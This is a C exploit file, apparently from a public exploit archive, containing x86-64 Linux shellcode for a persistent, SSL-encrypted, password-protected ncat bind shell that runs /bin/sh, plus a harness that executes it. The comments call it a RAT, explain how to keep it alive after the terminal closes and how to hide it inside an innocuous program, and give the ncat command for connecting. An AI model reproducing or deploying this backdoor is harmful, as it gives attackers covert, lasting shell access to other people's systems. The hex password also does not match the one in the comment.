#include <stdio.h>
#include <string.h>

// Exploit Title: [Linux 64bit Ncat + SSL + MultiChannel + Persistant + Fork + IPv4/6 + Password 176byte]
// Date: [7/5/2016]
// Exploit Author: [CripSlick]
// Tested on: [Kali 2.0]
// Version: [Ncat: Version 7.01]

// ShepherdDowling@gmail.com
// OffSec ID: OS-20614
// http://50.112.22.183/

//---------------------------------------------------------------------------------
// ALERT TO SETTINGS: If Fork is ON and MultiChannel is ON, you will need to either
// kill the PID or restart the computer in order to remove the RAT. That is why
// password and encryption is VERY important here.
//---------------------------------------------------------------------------------

// Default Use
// ncat --ssl -6 1000::66 9999 --proxy-auth creepin[:LaCrips] -v

// Any Use
// ncat --ssl -(4/6) (IPv4/IPv6) <port> --proxy-auth <username>[:<password>] -v

//---------------------------------------------------------------------------------


// Internet Protocol Version
// IPv6 = \x36
// IPv4 = \x34
#define IP "\x36"

// Username (Any Byte Size)
#define Username "\x63\x72\x65\x65\x70\x69\x6e"

// Password (Any Byte Size)
#define Password "\x4c\x61\xee\x43\x72\x69\x70\x73\x5d"

// Port (4 bytes)
// ascii (from 0 to 9) = 30, 31, 32, 33, 34, 35, 36, 37, 38, 39
#define Port "\x39\x39\x39\x39"


// MultiChannel & Non-Ceasing (persistant until terminal close unless Fork is on)
// on  = \x6b
// off = \x76
#define MultiChannel "\x6b"


// Fork allows the program to run after terminal close (I suggest MultiChannel on)
// Fork helps when linking payload to an innocuous program
// comment the fork out if you don't want it
#define Fork "\x6a\x39\x58\x48\x31\xff\x0f\x05\x48\x31\xff\x48\x39\xf8\x74\x08\x48\x31\xc0\x6a\x3c\x58\x0f\x05"



unsigned char code[] =

"\x48\x31\xff\x48\xf7\xe7"Fork
"\x68\x2f\x6e\x63\x61\xc6\x44\x24\x04\x74\x48\xbf\x2f\x75\x73\x72\x2f\x62\x69\x6e\x57\x48\x89\xe7\x50\x68\x2d\x2d\x73\x73\xc6\x44\x24\x04\x6c\x49\x89\xe6\x50\x49\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x57\x49\x89\xe7\x68\x2d"MultiChannel"\x76\x65\x49\x89\xe3\xeb\x3b\x48\x89\xe3\x68\x61\x75\x74\x68\x48\xb9\x2d\x2d\x70\x72\x6f\x78\x79\x2d\x51\x48\x89\xe1\x68"Port"\x49\x89\xe5\x68\x2d\x6c"IP"\x70\x49\x89\xe2\x50\x41\x56\x41\x57\x41\x53\x53\x51\x41\x55\x41\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xc0\xff\xff\xff"Username"\x5b\x3a"Password
;

int main ()
{
	// I make sure there are no nulls
	// The string count will terminate at the first \x00
	printf("The Shellcode is %d Bytes Long\n", strlen(code));

	// Next I throw 0xAAAAAAAA into every register before shellcode execution
	// This ensures that the shellcode will run in any circumstance

	__asm__("mov $0xAAAAAAAAAAAAAAAA, %rax\n\t"
		"mov %rax, %rbx\n\t" "mov %rax, %rcx\n\t" "mov %rax, %rdx\n\t"
		"mov %rax, %rsi\n\t" "mov %rax, %rdi\n\t" "mov %rax, %rbp\n\t"
		"mov %rax, %r10\n\t" "mov %rax, %r11\n\t" "mov %rax, %r12\n\t"
		"mov %rax, %r13\n\t" "mov %rax, %r14\n\t" "mov %rax, %r15\n\t"
		"call code");
	return 0;
}